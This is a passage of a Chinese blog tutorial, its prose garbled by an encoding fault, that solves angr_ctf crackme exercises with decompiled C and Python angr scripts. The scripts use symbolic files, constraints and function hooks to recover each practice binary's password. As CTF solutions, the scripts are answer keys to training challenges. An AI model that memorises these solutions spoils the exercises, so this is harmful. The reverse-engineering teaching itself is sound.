class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    start = <span class="number">0x080488D6</span></span><br><span class="line">    file_name = <span class="string">&#x27;OJKSQYDP.txt&#x27;</span></span><br><span class="line">    file_size = <span class="number">0x40</span></span><br><span class="line">    file_content = claripy.BVS(<span class="string">&#x27;file_content&#x27;</span>, file_size * <span class="number">8</span>)</span><br><span class="line">    <span class="comment"># åˆ›å»ºä¸€ä¸ªæ¨¡æ‹Ÿæ–‡ä»¶ä»¥ä¾›æ¨¡æ‹Ÿæ‰§è¡Œæ—¶å¯ä»¥è¯»å–</span></span><br><span class="line">    simgr_file = angr.storage.SimFile(file_name, content=file_content, size=file_size)</span><br><span class="line">    state = proj.factory.blank_state(addr = start)</span><br><span class="line">    <span class="comment"># state = proj.factory.entry_state()</span></span><br><span class="line">    <span class="comment"># æ’å…¥è¿›ç¨‹å¯è¯»å–æ–‡ä»¶çš„è™šæ‹Ÿç©ºé—´</span></span><br><span class="line">    state.fs.insert(file_name, simgr_file)</span><br><span class="line">    simgr = proj.factory.simulation_manager(state)</span><br><span class="line">    simgr.explore(find=is_succ, avoid=is_fail)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        <span class="built_in">print</span>(simgr.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(file_content, cast_to=<span class="built_in">bytes</span>))</span><br><span class="line">        <span class="comment"># print(simgr.found[0].posix.dumps(0))</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Answer not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<h3 id="angr-constraints-æ‰‹åŠ¨æ·»åŠ æ¡ä»¶"><a href="#angr-constraints-æ‰‹åŠ¨æ·»åŠ æ¡ä»¶" class="headerlink" title="angr_constraints | æ‰‹åŠ¨æ·»åŠ æ¡ä»¶"></a>angr_constraints | æ‰‹åŠ¨æ·»åŠ æ¡ä»¶</h3><p>å½“ç¨‹åºåœ¨å¾ªç¯è¿›è¡Œå¤šæ¬¡åˆ¤æ–­ ç¬¦å·æ‰§è¡Œæ—¶ä¼šäº§ç”ŸæŒ‡æ•°çº§çš„è·¯å¾„ä»è€Œå‘ç”Ÿè·¯å¾„çˆ†ç‚¸é—®é¢˜ æ¯”å¦‚è¿™é“é¢˜çš„åˆ¤æ–­é€»è¾‘:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_BOOL4 __cdecl <span class="title function_">check_equals_AUPDNNPROEZRJWKB</span><span class="params">(<span class="type">char</span> *input, <span class="type">unsigned</span> <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+8h] [ebp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( input[i] == *(i + <span class="number">0x804A040</span>) )         <span class="comment">// =&gt; input[i] == enc[i]</span></span><br><span class="line">      ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 == len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  qmemcpy(&amp;password, <span class="string">&quot;AUPDNNPROEZRJWKB&quot;</span>, <span class="number">16</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buffer, <span class="number">0</span>, <span class="number">0x11</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%16s&quot;</span>, &amp;buffer);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    *(i + <span class="number">134520912</span>) = complex_function(*(i + <span class="number">0x804A050</span>), <span class="number">15</span> - i);</span><br><span class="line">  <span class="keyword">if</span> ( check_equals_AUPDNNPROEZRJWKB(&amp;buffer, <span class="number">16</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯†æ–‡é•¿åº¦ä¸º16bytes ä¹Ÿå°±æ˜¯å¾ªç¯ä¸­å¯¹æ¯”çš„æ¬¡æ•°æ˜¯16æ¬¡ åŠ ä¸Šæœ€ååˆ¤æ–­æ˜¯å¦æ­£ç¡®çš„ä¸€æ¬¡åˆ¤æ–­ å¯èƒ½çš„è·¯å¾„è¾¾åˆ°äº†<code>2 ^ 17</code>æ¡ å¦‚æœç›´æ¥è®©angrç”¨è¿™ä¸ªå‡½æ•°è¿›è¡Œæ˜¯å¦æ­£ç¡®çš„åˆ¤æ–­è‚¯å®šä¼šè¿è¡Œå¾ˆé•¿æ—¶é—´ æˆ‘ä»¬ç›´æ¥åœ¨åˆ¤æ–­å‰ä¸­æ–­ç¨‹åº è®©ç¨‹åºè¿›å…¥æˆ‘ä»¬è‡ªå·±è®¾ç½®çš„é™åˆ¶æ¡ä»¶çš„ä»£ç æ®µ:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys, claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;08_angr_constraints&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    start = <span class="number">0x08048625</span></span><br><span class="line">    buf = <span class="number">0x804A050</span></span><br><span class="line">    state = proj.factory.blank_state(addr = start)</span><br><span class="line">    <span class="comment"># ä¸€å®šè¦å®ä¾‹åŒ–ä¸€ä¸ªç¬¦å·åŒ–å†…å­˜çš„å¼•ç”¨å‡ºæ¥</span></span><br><span class="line">    ans = state.solver.BVS(<span class="string">&#x27;buf&#x27;</span>, <span class="number">8</span>*<span class="number">16</span>)</span><br><span class="line">    state.memory.store(buf, ans)</span><br><span class="line">    simgr = proj.factory.simulation_manager(state)</span><br><span class="line">    simgr.explore(find=<span class="number">0x08048673</span>)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        new_state = simgr.found[<span class="number">0</span>]</span><br><span class="line">        string_after_processed = new_state.memory.load(buf, <span class="number">16</span>)</span><br><span class="line">        <span class="comment"># å’Œz3çš„ä½¿ç”¨ä¸€æ · æ·»åŠ é™åˆ¶æ¡ä»¶</span></span><br><span class="line">        new_state.solver.add(string_after_processed == <span class="string">&quot;AUPDNNPROEZRJWKB&quot;</span>)</span><br><span class="line">        <span class="comment"># å¦‚æœä¸Šé¢ä¸å®ä¾‹åŒ–ans ç›´æ¥ç”¨è¿›è¿‡ç¬¦å·æ‰§è¡Œåçš„å¯¹åº”å†…å­˜åŒºåŸŸçš„è¯ å¾—åˆ°çš„å°±æ˜¯F(x) è€Œä¸æ˜¯x</span></span><br><span class="line">        <span class="built_in">print</span>(new_state.solver.<span class="built_in">eval</span>(ans, cast_to=<span class="built_in">bytes</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Answer not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<h2 id="hookæŸä¸ªå‡½æ•°"><a href="#hookæŸä¸ªå‡½æ•°" class="headerlink" title="hookæŸä¸ªå‡½æ•°"></a>hookæŸä¸ªå‡½æ•°</h2><h3 id="angr-hooks-é€šè¿‡è°ƒç”¨åœ°å€hookå‡½æ•°"><a href="#angr-hooks-é€šè¿‡è°ƒç”¨åœ°å€hookå‡½æ•°" class="headerlink" title="angr_hooks | é€šè¿‡è°ƒç”¨åœ°å€hookå‡½æ•°"></a>angr_hooks | é€šè¿‡è°ƒç”¨åœ°å€hookå‡½æ•°</h3><p>è¿™ä¸€é¢˜å°è¯•ç”¨å¦ä¸€ç§æ–¹å¼è§£å†³è·¯å¾„çˆ†ç‚¸é—®é¢˜ åƒFrida hookä¸€æ ·å°†ä¼šäº§ç”Ÿè·¯å¾„çˆ†ç‚¸çš„å‡½æ•°æ›¿æ¢æˆè‡ªå·±å†™çš„å‡½æ•°</p>
<p>å’Œä¸Šä¸€é¢˜çš„å¯¹æ¯”é€»è¾‘å·®ä¸å¤š éƒ½æ˜¯ä¸€ä½ä¸€ä½æ¯”:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_BOOL4 __cdecl <span class="title function_">check_equals_XYMKBKUHNIQYNQXE</span><span class="params">(<span class="type">int</span> a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+8h] [ebp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(i + a1) == *(i + <span class="number">0x804A044</span>) )</span><br><span class="line">      ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 == a2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BOOL4 v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  qmemcpy(password, <span class="string">&quot;XYMKBKUHNIQYNQXE&quot;</span>, <span class="number">16</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">0x11</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%16s&quot;</span>, buffer);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    *(i + <span class="number">0x804A054</span>) = complex_function(*(i + <span class="number">0x804A054</span>), <span class="number">18</span> - i);</span><br><span class="line">  equals = check_equals_XYMKBKUHNIQYNQXE(buffer, <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">    *(j + <span class="number">0x804A044</span>) = complex_function(*(j + <span class="number">0x804A044</span>), j + <span class="number">9</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%16s&quot;</span>, buffer);</span><br><span class="line">  v3 = equals &amp;&amp; !<span class="built_in">strncmp</span>(buffer, password, <span class="number">0x10</span>u);</span><br><span class="line">  equals = v3;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>0x804A044å’Œ0x804A054åˆ†åˆ«å°±æ˜¯passwordå’Œbufferçš„åœ°å€ æ£€æŸ¥å‡½æ•°è¢«è°ƒç”¨çš„ä½ç½®:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:080486A9 83 EC 08                      sub     esp, 8</span><br><span class="line">.text:080486AC 6A 10                         push    10h</span><br><span class="line">.text:080486AE 68 54 A0 04 08                push    offset buffer</span><br><span class="line">.text:080486B3 E8 ED FE FF FF                call    check_equals_XYMKBKUHNIQYNQXE</span><br><span class="line">.text:080486B3</span><br><span class="line">.text:080486B8 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:080486BB A3 68 A0 04 08                mov     ds:equals, eax</span><br></pre></td></tr></table></figure>

<p>callè¯­å¥é•¿åº¦æ˜¯5bytes è¦hookçš„ä½ç½®ä¸æ˜¯å‡½æ•°çš„å¼€å¤´ æ˜¯callçš„ä½ç½® åŒæ—¶è¿˜éœ€è¦callæŒ‡ä»¤çš„é•¿åº¦ hookè„šæœ¬:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys, claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;09_angr_hooks&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    state = proj.factory.entry_state()</span><br><span class="line">    to_hook = <span class="number">0x80486B3</span></span><br><span class="line">    lenth = <span class="number">0x5</span></span><br><span class="line">    simgr = proj.factory.simulation_manager(state)</span><br><span class="line">    <span class="comment"># ç”¨å·¥ç¨‹å¯¹è±¡çš„hookä¿®é¥°å™¨</span></span><br><span class="line"><span class="meta">    @proj.hook(<span class="params">to_hook, length=lenth</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hook_func</span>(<span class="params">state</span>):    <span class="comment"># è¦æ›¿æ¢æˆçš„å‡½æ•°</span></span><br><span class="line">        to_cmp = state.memory.load(<span class="number">0x804A044</span>, <span class="number">0x10</span>)</span><br><span class="line">        arg = state.memory.load(<span class="number">0x804A054</span>, <span class="number">0x10</span>)</span><br><span class="line">        <span class="comment"># è¿”å›å€¼å­˜åœ¨eaxä¸­</span></span><br><span class="line">        state.regs.eax = claripy.If(to_cmp == arg, claripy.BVV(<span class="number">1</span>, <span class="number">32</span>), claripy.BVV(<span class="number">0</span>, <span class="number">32</span>))</span><br><span class="line">    simgr.explore(find=is_succ, avoid=is_fail)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        <span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Answer not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<h3 id="angr-simprocedures-é€šè¿‡ç¬¦å·hookå‡½æ•°"><a href="#angr-simprocedures-é€šè¿‡ç¬¦å·hookå‡½æ•°" class="headerlink" title="angr_simprocedures |  é€šè¿‡ç¬¦å·hookå‡½æ•°"></a>angr_simprocedures |  é€šè¿‡ç¬¦å·hookå‡½æ•°</h3><p>å½“è¦hookçš„å‡½æ•°åœ¨å¤šå¤„è¢«è°ƒç”¨ å¹¶ä¸”hookçš„ç›®çš„æ˜¯å½»åº•æ›´æ”¹å‡½æ•°æ‰§è¡Œçš„å†…å®¹å°±è¦å¯¹æ‰€æœ‰çš„è°ƒç”¨åœ°å€è¿›è¡Œhook éå¸¸éº»çƒ¦ ä¾‹å¦‚è¿™ä¸€é¢˜:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/29/20240729-090207.png" alt="image-20240729090200722"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+20h] [ebp-28h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">17</span>]; <span class="comment">// [esp+2Bh] [ebp-1Dh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;password, <span class="string">&quot;ORSDDWXHZURJRBDH&quot;</span>, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%16s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    s[i] = complex_function(s[i], <span class="number">18</span> - i);</span><br><span class="line">  <span class="keyword">if</span> ( check_equals_ORSDDWXHZURJRBDH((<span class="type">int</span>)s, <span class="number">0x10</span>u) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>ç¨‹åºè¢«è™šæ‹Ÿæ§åˆ¶æµæ··æ·†(è™½ç„¶IDAçš„åæ±‡ç¼–å¯ä»¥è½»æ¾ä¼˜åŒ–å‡ºå”¯ä¸€ä¼šæ‰§è¡Œçš„è·¯å¾„) è¿™æ ·å°±éœ€è¦å¯¹å‡½æ•°çš„ç¬¦å·è¿›è¡Œhook:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys, claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;10_angr_simprocedures&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    start = <span class="number">0x0</span></span><br><span class="line">    state = proj.factory.entry_state()</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">simpro</span>(angr.SimProcedure):</span><br><span class="line">        <span class="comment"># å‚æ•°éœ€è¦å¯¹åº”è¦hookçš„å‡½æ•°</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, user_input, lenth</span>):</span><br><span class="line">            to_cmp = <span class="string">&quot;ORSDDWXHZURJRBDH&quot;</span></span><br><span class="line">            content = self.state.memory.load(user_input, lenth)</span><br><span class="line">            <span class="keyword">return</span> claripy.If(content == to_cmp, claripy.BVV(<span class="number">1</span>, <span class="number">32</span>), claripy.BVV(<span class="number">0</span>, <span class="number">32</span>))</span><br><span class="line">    <span class="comment"># ä½œä¸ºhook_symbolçš„å‚æ•°çš„ç”¨æˆ·å‡½æ•°è¦å…ˆå®ä¾‹åŒ–</span></span><br><span class="line">    proj.hook_symbol(<span class="string">&#x27;check_equals_ORSDDWXHZURJRBDH&#x27;</span>, simpro())</span><br><span class="line">    simgr = proj.factory.simulation_manager(state)</span><br><span class="line">    simgr.explore(find=is_succ, avoid=is_fail)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        <span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Answer not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<h3 id="angr-sim-scanf-hookåº“å‡½æ•°"><a href="#angr-sim-scanf-hookåº“å‡½æ•°" class="headerlink" title="angr_sim_scanf | hookåº“å‡½æ•°"></a>angr_sim_scanf | hookåº“å‡½æ•°</h3><p>hookåº“å‡½æ•°çš„æµç¨‹å’Œä¸Šä¸€é¢˜ä¸€æ · è¿™é¢˜ä¹Ÿæ˜¯è™šæ‹Ÿæ§åˆ¶æµæ··æ·† è¦ç”¨hookç»•è¿‡angråªèƒ½è¾“å…¥ä¸€ä¸ªå‚æ•°çš„é—®é¢˜(ç°ç‰ˆæœ¬å·²ç»æ²¡æœ‰è¿™ä¸ªé—®é¢˜):</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+20h] [ebp-28h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">20</span>]; <span class="comment">// [esp+28h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  qmemcpy(s, <span class="string">&quot;SUQMKQFX&quot;</span>, <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    s[i] = complex_function(s[i], i);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u %u&quot;</span>, buffer0, buffer1);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(buffer0, s, <span class="number">4u</span>) &amp;&amp; !<span class="built_in">strncmp</span>(buffer1, &amp;s[<span class="number">4</span>], <span class="number">4u</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è™½ç„¶å‡½æ•°åŸå‹æ˜¯å¯å˜å‚æ•° ä½†æ˜¯æ„é€ hookå‡½æ•°çš„æ—¶å€™æ ¹æ®è¦hookçš„é‚£ä¸ªscanfè¿›è¡Œå‚æ•°ä¸ªæ•°çš„è®¾ç½®å°±è¡Œ:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys, claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;11_angr_sim_scanf&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">    start = <span class="number">0x0</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">sim_scanf</span>(angr.SimProcedure):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self, format_string, buf1, buf2</span>):</span><br><span class="line">            p1, p2 = claripy.BVS(<span class="string">&#x27;p1&#x27;</span>, <span class="number">8</span>*<span class="number">4</span>), claripy.BVS(<span class="string">&#x27;p2&#x27;</span>, <span class="number">8</span>*<span class="number">4</span>)</span><br><span class="line">            self.state.memory.store(buf1, p1, endness=proj.arch.memory_endness)</span><br><span class="line">            self.state.memory.store(buf2, p2, endness=proj.arch.memory_endness)</span><br><span class="line">            self.state.<span class="built_in">globals</span>[<span class="string">&#x27;ans&#x27;</span>] = (p1, p2)</span><br><span class="line">    proj.hook_symbol(<span class="string">&#x27;__isoc99_scanf&#x27;</span>, sim_scanf())</span><br><span class="line">    state = proj.factory.entry_state()</span><br><span class="line">    simgr = proj.factory.simulation_manager(state)</span><br><span class="line">    simgr.explore(find=is_succ, avoid=is_fail)</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        solved_state = simgr.found[<span class="number">0</span>]</span><br><span class="line">        p1, p2 = solved_state.<span class="built_in">globals</span>[<span class="string">&#x27;ans&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(solved_state.solver.<span class="built_in">eval</span>(p1, cast_to=<span class="built_in">bytes</span>) + solved_state.solver.<span class="built_in">eval</span>(p2, cast_to=<span class="built_in">bytes</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Answer not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<h3 id="angr-veritesting-ä¸çŸ¥é“æœ‰æ²¡æœ‰ç”¨çš„æŠ€æœ¯"><a href="#angr-veritesting-ä¸çŸ¥é“æœ‰æ²¡æœ‰ç”¨çš„æŠ€æœ¯" class="headerlink" title="angr_veritesting | ä¸çŸ¥é“æœ‰æ²¡æœ‰ç”¨çš„æŠ€æœ¯"></a>angr_veritesting | ä¸çŸ¥é“æœ‰æ²¡æœ‰ç”¨çš„æŠ€æœ¯</h3><p>è¿™é¢˜çš„å®˜æ–¹è§£ç°åœ¨(2024.7.30)å·²ç»è·‘ä¸å‡ºç»“æœå‡ºæ¥äº† æ®å®˜æ–¹æ–‡æ¡£ è¿™ç§æ–¹æ³•æ˜¯ç»“åˆé™æ€ç¬¦å·åˆ†ææ¥å‡å°‘ç¬¦å·è·¯å¾„çš„æ¡æ•° ä½†æ˜¯å°±ç®—å¼€å¯äº†ä¹Ÿæ²¡åŠæ³•è§£å†³æœ¬é¢˜è·¯å¾„çˆ†ç‚¸é—®é¢˜ æ‰€ä»¥ç”¨ä¹‹å‰çš„åšæ³•åšè¿™é¢˜ æŠŠè·¯å¾„çˆ†ç‚¸çš„éƒ¨åˆ†æ›¿æ¢æˆç”¨æˆ·å‡½æ•°</p>
